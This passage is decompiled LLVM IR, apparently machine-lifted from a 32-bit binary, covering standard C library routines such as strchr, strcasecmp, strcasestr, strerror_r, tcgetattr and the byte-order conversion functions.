  uselistorder i32 %v1_11e20, { 2, 1, 0 }
  uselistorder i32 %v2_11e10, { 1, 0 }
  uselistorder i32 %v1_11e00, { 1, 0 }
  uselistorder i32 %v0_11dfc, { 1, 0 }
  uselistorder i32 %v6_11df0, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11e50, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_11e28, { 1, 0 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_11e5c = urem i32 %arg1, 256
  %v0_11e7c3 = load i32, i32* @r0, align 4
  %v1_11e7c4 = urem i32 %v0_11e7c3, 4
  %v2_11e7c5 = icmp eq i32 %v1_11e7c4, 0
  br i1 %v2_11e7c5, label %dec_label_pc_11e84, label %dec_label_pc_11e64

dec_label_pc_11e64:                               ; preds = %entry, %dec_label_pc_11e78
  %v0_11e78 = phi i32 [ %v1_11e78, %dec_label_pc_11e78 ], [ %v0_11e7c3, %entry ]
  %v1_11e64 = inttoptr i32 %v0_11e78 to i8*
  %v2_11e64 = load i8, i8* %v1_11e64, align 1
  %v3_11e64 = zext i8 %v2_11e64 to i32
  store i32 %v3_11e64, i32* @r3, align 4
  %v9_11e68 = icmp eq i32 %v3_11e64, %v1_11e5c
  br i1 %v9_11e68, label %dec_label_pc_11f38, label %dec_label_pc_11e70

dec_label_pc_11e70:                               ; preds = %dec_label_pc_11e64
  %v2_11e70 = icmp eq i8 %v2_11e64, 0
  br i1 %v2_11e70, label %dec_label_pc_11f34, label %dec_label_pc_11e78

dec_label_pc_11e78:                               ; preds = %dec_label_pc_11e70
  %v1_11e78 = add i32 %v0_11e78, 1
  %v1_11e7c = urem i32 %v1_11e78, 4
  %v2_11e7c = icmp eq i32 %v1_11e7c, 0
  br i1 %v2_11e7c, label %dec_label_pc_11e84, label %dec_label_pc_11e64

dec_label_pc_11e84:                               ; preds = %dec_label_pc_11e78, %entry
  %v0_11e88 = phi i32 [ %v0_11e7c3, %entry ], [ %v1_11e78, %dec_label_pc_11e78 ]
  %v4_11e84 = mul nuw nsw i32 %v1_11e5c, 256
  %v5_11e84 = or i32 %v4_11e84, %v1_11e5c
  %v4_11e8c = mul i32 %v5_11e84, 65536
  %v5_11e8c = or i32 %v4_11e8c, %v5_11e84
  br label %dec_label_pc_11e90

dec_label_pc_11e90:                               ; preds = %dec_label_pc_11f2c, %dec_label_pc_11ecc, %dec_label_pc_11e84
  %v0_11ef4 = phi i32 [ %v0_11e88, %dec_label_pc_11e84 ], [ %v4_11e90, %dec_label_pc_11ecc ], [ %v4_11e90, %dec_label_pc_11f2c ]
  %v1_11e90 = inttoptr i32 %v0_11ef4 to i32*
  %v2_11e90 = load i32, i32* %v1_11e90, align 4
  %v4_11e90 = add i32 %v0_11ef4, 4
  %v2_11e98 = xor i32 %v2_11e90, %v5_11e8c
  %v2_11e9c = add i32 %v2_11e98, 2130640639
  store i32 %v2_11e9c, i32* @ip, align 4
  %v2_11ea4 = add i32 %v2_11e90, 2130640639
  %v1_11ea8 = sub i32 -1, %v2_11e90
  %v2_11eac = xor i32 %v2_11ea4, %v1_11ea8
  %v2_11eb8 = and i32 %v2_11eac, -2130640640
  %v2_11ec0 = icmp eq i32 %v2_11eb8, 0
  br i1 %v2_11ec0, label %dec_label_pc_11ecc, label %dec_label_pc_11ed4

dec_label_pc_11ecc:                               ; preds = %dec_label_pc_11e90
  %v1_11eb4 = sub i32 -1, %v2_11e98
  %v2_11ebc = xor i32 %v2_11e9c, %v1_11eb4
  %v2_11ec4 = and i32 %v2_11ebc, -2130640640
  %v2_11ecc = icmp eq i32 %v2_11ec4, 0
  br i1 %v2_11ecc, label %dec_label_pc_11e90, label %dec_label_pc_11ed4

dec_label_pc_11ed4:                               ; preds = %dec_label_pc_11e90, %dec_label_pc_11ecc
  %v2_11ed4 = inttoptr i32 %v0_11ef4 to i8*
  %v3_11ed4 = load i8, i8* %v2_11ed4, align 1
  %v4_11ed4 = zext i8 %v3_11ed4 to i32
  store i32 %v4_11ed4, i32* @r3, align 4
  %v9_11ed8 = icmp eq i32 %v4_11ed4, %v1_11e5c
  br i1 %v9_11ed8, label %dec_label_pc_11f38, label %dec_label_pc_11ee4

dec_label_pc_11ee4:                               ; preds = %dec_label_pc_11ed4
  %v2_11ee4 = icmp eq i8 %v3_11ed4, 0
  br i1 %v2_11ee4, label %dec_label_pc_11f34, label %dec_label_pc_11eec

dec_label_pc_11eec:                               ; preds = %dec_label_pc_11ee4
  %v1_11eec = add i32 %v0_11ef4, 1
  %v2_11eec = inttoptr i32 %v1_11eec to i8*
  %v3_11eec = load i8, i8* %v2_11eec, align 1
  %v4_11eec = zext i8 %v3_11eec to i32
  store i32 %v4_11eec, i32* @r3, align 4
  %v9_11ef0 = icmp eq i32 %v4_11eec, %v1_11e5c
  br i1 %v9_11ef0, label %dec_label_pc_11f38, label %dec_label_pc_11efc

dec_label_pc_11efc:                               ; preds = %dec_label_pc_11eec
  %v2_11efc = icmp eq i8 %v3_11eec, 0
  br i1 %v2_11efc, label %dec_label_pc_11f34, label %dec_label_pc_11f04

dec_label_pc_11f04:                               ; preds = %dec_label_pc_11efc
  %v1_11f04 = add i32 %v0_11ef4, 2
  %v2_11f04 = inttoptr i32 %v1_11f04 to i8*
  %v3_11f04 = load i8, i8* %v2_11f04, align 1
  %v4_11f04 = zext i8 %v3_11f04 to i32
  store i32 %v4_11f04, i32* @r3, align 4
  %v9_11f08 = icmp eq i32 %v4_11f04, %v1_11e5c
  br i1 %v9_11f08, label %dec_label_pc_11f38, label %dec_label_pc_11f14

dec_label_pc_11f14:                               ; preds = %dec_label_pc_11f04
  %v2_11f14 = icmp eq i8 %v3_11f04, 0
  br i1 %v2_11f14, label %dec_label_pc_11f34, label %dec_label_pc_11f1c

dec_label_pc_11f1c:                               ; preds = %dec_label_pc_11f14
  %v1_11f1c = add i32 %v0_11ef4, 3
  %v2_11f1c = inttoptr i32 %v1_11f1c to i8*
  %v3_11f1c = load i8, i8* %v2_11f1c, align 1
  %v4_11f1c = zext i8 %v3_11f1c to i32
  store i32 %v4_11f1c, i32* @r3, align 4
  %v9_11f20 = icmp eq i32 %v4_11f1c, %v1_11e5c
  br i1 %v9_11f20, label %dec_label_pc_11f38, label %dec_label_pc_11f2c

dec_label_pc_11f2c:                               ; preds = %dec_label_pc_11f1c
  %v2_11f2c = icmp eq i8 %v3_11f1c, 0
  br i1 %v2_11f2c, label %dec_label_pc_11f34, label %dec_label_pc_11e90

dec_label_pc_11f34:                               ; preds = %dec_label_pc_11e70, %dec_label_pc_11f2c, %dec_label_pc_11f14, %dec_label_pc_11efc, %dec_label_pc_11ee4
  br label %dec_label_pc_11f38

dec_label_pc_11f38:                               ; preds = %dec_label_pc_11e64, %dec_label_pc_11f1c, %dec_label_pc_11f04, %dec_label_pc_11eec, %dec_label_pc_11ed4, %dec_label_pc_11f34
  %v1_11f3c = phi i32 [ 0, %dec_label_pc_11f34 ], [ %v1_11f1c, %dec_label_pc_11f1c ], [ %v1_11f04, %dec_label_pc_11f04 ], [ %v1_11eec, %dec_label_pc_11eec ], [ %v0_11ef4, %dec_label_pc_11ed4 ], [ %v0_11e78, %dec_label_pc_11e64 ]
  ret i32 %v1_11f3c

; uselistorder directives
  uselistorder i32 %v4_11e90, { 1, 0 }
  uselistorder i32 %v2_11e90, { 0, 2, 1 }
  uselistorder i32 %v0_11ef4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_11e84, { 1, 0 }
  uselistorder i32 %v1_11e78, { 1, 0, 2 }
  uselistorder i32 %v0_11e7c3, { 2, 1, 0 }
  uselistorder i32 %v1_11e5c, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_11f38, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_11f34, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_11ed4, { 1, 0 }
  uselistorder label %dec_label_pc_11e64, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_11f50 = call i32 @__xpg_strerror_r()
  %v0_11f54 = load i32, i32* @r4, align 4
  ret i32 %v0_11f54
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 28800), i32* @r2, align 4
  %v0_11f78 = call i32 @strtok_r()
  ret i32 %v0_11f78
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @ip, align 4
  br label %dec_label_pc_11fac

dec_label_pc_11fac:                               ; preds = %dec_label_pc_11fd8, %entry
  %v1_11ff08 = phi i32 [ %v1_11ff09, %dec_label_pc_11fd8 ], [ 0, %entry ]
  %v0_11fe0 = phi i32 [ %v1_11fe0, %dec_label_pc_11fd8 ], [ %arg2, %entry ]
  %v0_11fe4 = phi i32 [ %v1_11fe4, %dec_label_pc_11fd8 ], [ %tmp, %entry ]
  %v9_11fac = icmp eq i32 %v0_11fe4, %v0_11fe0
  %.pre = inttoptr i32 %v0_11fe4 to i8*
  br i1 %v9_11fac, label %dec_label_pc_11fd8, label %dec_label_pc_11fb4

dec_label_pc_11fb4:                               ; preds = %dec_label_pc_11fac
  %v2_11fb4 = load i8, i8* %.pre, align 1
  %v3_11fb4 = zext i8 %v2_11fb4 to i32
  %v1_11fb8 = inttoptr i32 %v0_11fe0 to i8*
  %v2_11fb8 = load i8, i8* %v1_11fb8, align 1
  %v3_11fb8 = zext i8 %v2_11fb8 to i32
  %v4_11fbc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 4120) to i32*), align 4
  %v2_11fc0 = mul nuw nsw i32 %v3_11fb8, 2
  %v2_11fc4 = mul nuw nsw i32 %v3_11fb4, 2
  %v2_11fc8 = add i32 %v4_11fbc, %v2_11fc0
  %v3_11fc8 = inttoptr i32 %v2_11fc8 to i16*
  %v4_11fc8 = load i16, i16* %v3_11fc8, align 2
  %v6_11fc8 = sext i16 %v4_11fc8 to i32
  %v2_11fcc = add i32 %v4_11fbc, %v2_11fc4
  %v3_11fcc = inttoptr i32 %v2_11fcc to i16*
  %v4_11fcc = load i16, i16* %v3_11fcc, align 2
  %v6_11fcc = sext i16 %v4_11fcc to i32
  %v2_11fd0 = sub nsw i32 %v6_11fcc, %v6_11fc8
  %v9_11fd0 = icmp eq i16 %v4_11fcc, %v4_11fc8
  br i1 %v9_11fd0, label %dec_label_pc_11fd8, label %dec_label_pc_11fec

dec_label_pc_11fd8:                               ; preds = %dec_label_pc_11fac, %dec_label_pc_11fb4
  %v1_11ff09 = phi i32 [ %v2_11fd0, %dec_label_pc_11fb4 ], [ %v1_11ff08, %dec_label_pc_11fac ]
  %v2_11fd8 = load i8, i8* %.pre, align 1
  %v2_11fdc = icmp eq i8 %v2_11fd8, 0
  %v1_11fe0 = add i32 %v0_11fe0, 1
  %v1_11fe4 = add i32 %v0_11fe4, 1
  store i32 %v1_11fe4, i32* @ip, align 4
  br i1 %v2_11fdc, label %dec_label_pc_11fec, label %dec_label_pc_11fac

dec_label_pc_11fec:                               ; preds = %dec_label_pc_11fd8, %dec_label_pc_11fb4
  %v1_11ff0 = phi i32 [ %v1_11ff09, %dec_label_pc_11fd8 ], [ %v2_11fd0, %dec_label_pc_11fb4 ]
  ret i32 %v1_11ff0

; uselistorder directives
  uselistorder i32 %v1_11fe4, { 1, 0 }
  uselistorder i32 %v2_11fd0, { 1, 0 }
  uselistorder i32 %v0_11fe4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11fd8, { 1, 0 }
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_11ffc = load i32, i32* @r4, align 4
  %v9_11ffc = load i32, i32* @r6, align 4
  %v0_12004 = load i32, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r6, align 4
  store i32 %v0_12004, i32* @ip, align 4
  %v0_12014 = load i32, i32* @r1, align 4
  store i32 %v0_12014, i32* @r7, align 4
  %v0_12018 = load i32, i32* @r2, align 4
  store i32 %v0_12018, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_12004, 124
  br i1 %tmp, label %dec_label_pc_12050, label %dec_label_pc_12020

dec_label_pc_12020:                               ; preds = %entry
  br label %dec_label_pc_12038

dec_label_pc_1202c:                               ; preds = %dec_label_pc_12038
  br i1 %v2_12044, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_1202c
  %v2_12030 = add i32 %v1_12048, -1
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_1202c, %bb
  %v0_120381 = phi i32 [ %v1_12048, %dec_label_pc_1202c ], [ %v2_12030, %bb ]
  %v1_12034 = add i32 %v0_12034, 1
  br label %dec_label_pc_12038

dec_label_pc_12038:                               ; preds = %dec_label_pc_12020, %bb15
  %v1_12048 = phi i32 [ %v0_12004, %dec_label_pc_12020 ], [ %v0_120381, %bb15 ]
  %v0_12034 = phi i32 [ add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -36876), %dec_label_pc_12020 ], [ %v1_12034, %bb15 ]
  store i32 %v0_12034, i32* @r5, align 4
  %v2_12038 = icmp eq i32 %v1_12048, 0
  %v1_1203c = inttoptr i32 %v0_12034 to i8*
  %v2_1203c = load i8, i8* %v1_1203c, align 1
  %v3_1203c = zext i8 %v2_1203c to i32
  store i32 %v3_1203c, i32* @r3, align 4
  %v2_12044 = icmp eq i8 %v2_1203c, 0
  br i1 %v2_12038, label %dec_label_pc_12044, label %dec_label_pc_1202c

dec_label_pc_12044:                               ; preds = %dec_label_pc_12038
  br i1 %v2_12044, label %dec_label_pc_12050, label %bb16

bb16:                                             ; preds = %dec_label_pc_12044
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1208c

dec_label_pc_12050:                               ; preds = %dec_label_pc_12044, %entry
  store i32 %v0_12004, i32* @r2, align 4
  %v3_12058 = ashr i32 %v0_12004, 31
  store i32 %v3_12058, i32* @r3, align 4
  %v6_1206c = bitcast i32* %stack_var_-25 to i8*
  %v7_1206c = call i32 @_uintmaxtostr(i8* %v6_1206c)
  %v1_12074 = add i32 %v7_1206c, -14
  store i32 %v1_12074, i32* @r5, align 4
  %v0_12078 = load i32, i32* @r6, align 4
  %v2_12078 = add i32 %v0_12078, -36892
  store i32 %v2_12078, i32* @r1, align 4
  store i32 %v1_12074, i32* @r0, align 4
  store i32 14, i32* @r2, align 4
  %v0_12084 = call i32 @memcpy()
  store i32 22, i32* %r6.global-to-local, align 4
  %v0_1208c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1208c

dec_label_pc_1208c:                               ; preds = %bb16, %dec_label_pc_12050
  %v0_1208c = phi i32 [ %v0_12034, %bb16 ], [ %v0_1208c.pre, %dec_label_pc_12050 ]
  %v1_1208c = inttoptr i32 %v0_1208c to i8*
  %v3_12090 = call i32 @strlen(i8* %v1_1208c)
  %v0_12094 = load i32, i32* @r7, align 4
  %v2_12094 = icmp eq i32 %v0_12094, 0
  br i1 %v2_12094, label %bb17, label %dec_label_pc_1208c._crit_edge

dec_label_pc_1208c._crit_edge:                    ; preds = %dec_label_pc_1208c
  %v1_120a0.pre = load i32, i32* @r4, align 4
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_1208c
  store i32 0, i32* @r4, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1208c._crit_edge, %bb17
  %v1_120a0 = phi i32 [ %v1_120a0.pre, %dec_label_pc_1208c._crit_edge ], [ 0, %bb17 ]
  %v1_1209c = add i32 %v3_12090, 1
  %v3_120a0 = icmp uge i32 %v1_1209c, %v1_120a0
  %v9_120a0 = icmp eq i32 %v1_1209c, %v1_120a0
  %v2_120a4 = xor i1 %v3_120a0, true
  %v3_120a4 = or i1 %v9_120a0, %v2_120a4
  br i1 %v3_120a4, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 %v1_1209c, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_120b4 = phi i32 [ %v1_120a0, %bb18 ], [ %v1_1209c, %bb19 ]
  %v2_120a8 = xor i1 %v9_120a0, true
  %v3_120a8 = and i1 %v3_120a0, %v2_120a8
  br i1 %v3_120a8, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 34, i32* %r6.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v2_120ac = icmp eq i32 %v0_120b4, 0
  br i1 %v2_120ac, label %dec_label_pc_120d0, label %dec_label_pc_120b4

dec_label_pc_120b4:                               ; preds = %bb22
  store i32 %v0_120b4, i32* @r2, align 4
  %v0_120b8 = load i32, i32* @r5, align 4
  store i32 %v0_120b8, i32* @r1, align 4
  store i32 %v0_12094, i32* @r0, align 4
  %v0_120c0 = call i32 @memcpy()
  %v0_120c4 = load i32, i32* @r4, align 4
  %v1_120c4 = load i32, i32* @r7, align 4
  %v2_120c4 = add i32 %v1_120c4, %v0_120c4
  %v3_120cc = add i32 %v2_120c4, -1
  %v4_120cc = inttoptr i32 %v3_120cc to i8*
  store i8 0, i8* %v4_120cc, align 1
  br label %dec_label_pc_120d0

dec_label_pc_120d0:                               ; preds = %bb22, %dec_label_pc_120b4
  %v0_120d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_120d0 = icmp eq i32 %v0_120d0, 0
  br i1 %v2_120d0, label %dec_label_pc_120e0, label %dec_label_pc_120d8

dec_label_pc_120d8:                               ; preds = %dec_label_pc_120d0
  %v0_120d8 = call i32 @__GI___errno_location()
  %v0_120dc = load i32, i32* %r6.global-to-local, align 4
  %v2_120dc = inttoptr i32 %v0_120d8 to i32*
  store i32 %v0_120dc, i32* %v2_120dc, align 4
  %v0_120e0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_120e0

dec_label_pc_120e0:                               ; preds = %dec_label_pc_120d0, %dec_label_pc_120d8
  %v0_120e0 = phi i32 [ 0, %dec_label_pc_120d0 ], [ %v0_120e0.pre, %dec_label_pc_120d8 ]
  store i32 %v3_11ffc, i32* @r4, align 4
  store i32 %v9_11ffc, i32* %r6.global-to-local, align 4
  ret i32 %v0_120e0

; uselistorder directives
  uselistorder i1 %v3_120a0, { 1, 0 }
  uselistorder i32 %v0_12034, { 0, 2, 3, 1 }
  uselistorder i32 %v1_12048, { 1, 0, 2 }
  uselistorder i32 %v0_12004, { 2, 1, 3, 0, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 3, 4, 5, 1, 2, 6 }
  uselistorder label %dec_label_pc_120e0, { 1, 0 }
  uselistorder label %dec_label_pc_120d0, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_1208c, { 1, 0 }
  uselistorder label %dec_label_pc_12038, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_12108 = load i32, i32* %r0.global-to-local, align 4
  %v1_1211c23 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_1211c.outer

dec_label_pc_1211c.outer:                         ; preds = %dec_label_pc_1215c, %entry
  %v0_1215c.ph = phi i32 [ %v1_1215c, %dec_label_pc_1215c ], [ %v0_12108, %entry ]
  %v2_1211c24 = load i8, i8* %v1_1211c23, align 1
  %v2_1212026 = icmp eq i8 %v2_1211c24, 0
  br i1 %v2_1212026, label %bb, label %dec_label_pc_12134

bb:                                               ; preds = %dec_label_pc_1211c.backedge, %dec_label_pc_1211c.outer
  store i32 %v0_1215c.ph, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12170

dec_label_pc_12134:                               ; preds = %dec_label_pc_1211c.outer, %dec_label_pc_1211c.backedge
  %v1_1212832.in = phi i32 [ %v1_1212832, %dec_label_pc_1211c.backedge ], [ %arg2, %dec_label_pc_1211c.outer ]
  %v2_1211c30 = phi i8 [ %v2_1211c, %dec_label_pc_1211c.backedge ], [ %v2_1211c24, %dec_label_pc_1211c.outer ]
  %v2_1212431.in.in = phi i8 [ %v2_1211c, %dec_label_pc_1211c.backedge ], [ %v2_1211c24, %dec_label_pc_1211c.outer ]
  %v0_1214029 = phi i32 [ %v1_12140, %dec_label_pc_1211c.backedge ], [ %v0_1215c.ph, %dec_label_pc_1211c.outer ]
  %v1_1212832 = add i32 %v1_1212832.in, 1
  %v1_12134 = inttoptr i32 %v0_1214029 to i8*
  %v2_12134 = load i8, i8* %v1_12134, align 1
  %v3_12134 = zext i8 %v2_12134 to i32
  store i32 %v3_12134, i32* %r0.global-to-local, align 4
  %v9_12138 = icmp eq i8 %v2_1211c30, %v2_12134
  %v1_12140 = add i32 %v0_1214029, 1
  br i1 %v9_12138, label %dec_label_pc_1211c.backedge, label %dec_label_pc_12148

dec_label_pc_1211c.backedge:                      ; preds = %dec_label_pc_12134, %dec_label_pc_12148
  %v1_1211c = inttoptr i32 %v1_1212832 to i8*
  %v2_1211c = load i8, i8* %v1_1211c, align 1
  %v2_12120 = icmp eq i8 %v2_1211c, 0
  br i1 %v2_12120, label %bb, label %dec_label_pc_12134

dec_label_pc_12148:                               ; preds = %dec_label_pc_12134
  %v2_1212431.in = zext i8 %v2_1212431.in.in to i32
  %v2_1213c = mul nuw nsw i32 %v3_12134, 2
  %v2_1212431 = mul nuw nsw i32 %v2_1212431.in, 2
  %v4_12148 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 4120) to i32*), align 4
  %v2_1214c = add i32 %v4_12148, %v2_1213c
  %v3_1214c = inttoptr i32 %v2_1214c to i16*
  %v4_1214c = load i16, i16* %v3_1214c, align 2
  %v2_12150 = add i32 %v4_12148, %v2_1212431
  %v3_12150 = inttoptr i32 %v2_12150 to i16*
  %v4_12150 = load i16, i16* %v3_12150, align 2
  %v9_12154 = icmp eq i16 %v4_12150, %v4_1214c
  br i1 %v9_12154, label %dec_label_pc_1211c.backedge, label %dec_label_pc_1215c

dec_label_pc_1215c:                               ; preds = %dec_label_pc_12148
  %v1_1215c = add i32 %v0_1215c.ph, 1
  %v2_12160 = icmp eq i8 %v2_12134, 0
  br i1 %v2_12160, label %dec_label_pc_12170, label %dec_label_pc_1211c.outer

dec_label_pc_12170:                               ; preds = %dec_label_pc_1215c, %bb
  %v1_12174 = phi i32 [ %v0_1215c.ph, %bb ], [ 0, %dec_label_pc_1215c ]
  ret i32 %v1_12174

; uselistorder directives
  uselistorder i8 %v2_1211c, { 2, 1, 0 }
  uselistorder i32 %v0_1214029, { 1, 0 }
  uselistorder i32 %v0_1215c.ph, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1211c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_12134, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_12188 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_12188, i32* @r1, align 4
  %v0_1218c = call i32 @__GI_tcgetattr()
  %v1_12190 = sub i32 1, %v0_1218c
  %v2_12190 = icmp ult i32 %v0_1218c, 2
  br i1 %v2_12190, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_121a0 = phi i32 [ %v1_12190, %entry ], [ 0, %bb ]
  ret i32 %v1_121a0

; uselistorder directives
  uselistorder i32 %v0_1218c, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_121a4 = load i32, i32* @r4, align 4
  %v6_121a4 = load i32, i32* @r5, align 4
  %v2_121ac = ptrtoint i32* %stack_var_-52 to i32
  %v0_121b0 = load i32, i32* @r1, align 4
  store i32 %v0_121b0, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_121bc = load i32, i32* @r0, align 4
  %v3_121bc = call i32 @ioctl(i32 %v0_121bc, i32 21505, i32 %v2_121ac)
  store i32 %v3_121bc, i32* %r0.global-to-local, align 4
  store i32 %v3_121bc, i32* @r5, align 4
  %v2_121c0 = icmp eq i32 %v3_121bc, 0
  br i1 %v2_121c0, label %dec_label_pc_121c8, label %dec_label_pc_1220c

dec_label_pc_121c8:                               ; preds = %entry
  %v4_121d4 = zext i8 %tmp to i32
  store i32 %v4_121d4, i32* @ip, align 4
  %v3_121d8 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_121d8, i32* @r3, align 4
  %v1_121dc = load i32, i32* @r4, align 4
  %v2_121dc = add i32 %v1_121dc, 4
  %v3_121dc = inttoptr i32 %v2_121dc to i32*
  %v0_121e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_121e0 = load i32, i32* @r4, align 4
  %v2_121e0 = add i32 %v1_121e0, 8
  %v3_121e0 = inttoptr i32 %v2_121e0 to i32*
  store i32 %v0_121e0, i32* %v3_121e0, align 4
  %v0_121e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_121e4 = load i32, i32* @r4, align 4
  %v2_121e4 = add i32 %v1_121e4, 12
  %v3_121e4 = inttoptr i32 %v2_121e4 to i32*
  store i32 %v0_121e4, i32* %v3_121e4, align 4
  %v2_121e8 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_121e8, i32* @r1, align 4
  %v1_121f0 = load i32, i32* @r4, align 4
  %v2_121f0 = inttoptr i32 %v1_121f0 to i32*
  store i32 %v3_121d8, i32* %v2_121f0, align 4
  %v0_121f4 = load i32, i32* @ip, align 4
  %v1_121f4 = trunc i32 %v0_121f4 to i8
  %v2_121f4 = load i32, i32* @r4, align 4
  %v3_121f4 = add i32 %v2_121f4, 16
  %v4_121f4 = inttoptr i32 %v3_121f4 to i8*
  store i8 %v1_121f4, i8* %v4_121f4, align 1
  %v0_121f8 = load i32, i32* @r4, align 4
  %v1_121f8 = add i32 %v0_121f8, 17
  store i32 %v1_121f8, i32* %r0.global-to-local, align 4
  %v4_121fc = call i32 @__GI_mempcpy(i32 %v1_121f8, i32 %v2_121e8, i32 19, i32 %v3_121d8)
  store i32 %v4_121fc, i32* %r0.global-to-local, align 4
  %v0_12200 = load i32, i32* @r5, align 4
  store i32 %v0_12200, i32* %r1.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_12208 = inttoptr i32 %v4_121fc to i8*
  %v3_12208 = call i32 @__GI_memset(i8* %v2_12208, i32 %v0_12200)
  store i32 %v3_12208, i32* %r0.global-to-local, align 4
  %v0_1220c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1220c

dec_label_pc_1220c:                               ; preds = %entry, %dec_label_pc_121c8
  %v0_1220c = phi i32 [ %v3_121bc, %entry ], [ %v0_1220c.pre, %dec_label_pc_121c8 ]
  store i32 %v0_1220c, i32* %r0.global-to-local, align 4
  store i32 %v3_121a4, i32* @r4, align 4
  store i32 %v6_121a4, i32* @r5, align 4
  ret i32 %v0_1220c

; uselistorder directives
  uselistorder i32 %v0_1220c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder label %dec_label_pc_1220c, { 1, 0 }
}

define i32 @__GI_htons(i32 %arg1) local_unnamed_addr {
entry:
  %v3_12220 = udiv i32 %arg1, 256
  %v1_12224 = mul i32 %arg1, 256
  %v4_12228 = and i32 %v1_12224, 65280
  %v5_12228 = or i32 %v4_12228, %v3_12220
  ret i32 %v5_12228
}

define i32 @__GI_htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_12248 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_12248
}

define i32 @__GI_ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v3_12250 = udiv i32 %arg1, 256
  %v1_12254 = mul i32 %arg1, 256
  %v4_12258 = and i32 %v1_12254, 65280
  %v5_12258 = or i32 %v4_12258, %v3_12250
  ret i32 %v5_12258
}

define i32 @__GI_ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_12278 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_12278
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %v3_12280 = load i32, i32* @r4, align 4
  %v6_12280 = load i32, i32* @r5, align 4
  %v9_12280 = load i32, i32* @r6, align 4
  %v12_12280 = load i32, i32* @r7, align 4
  %v15_12280 = load i32, i32* @r8, align 4
  %v18_12280 = load i32, i32* @sb, align 4
  %v21_12280 = load i32, i32* @sl, align 4
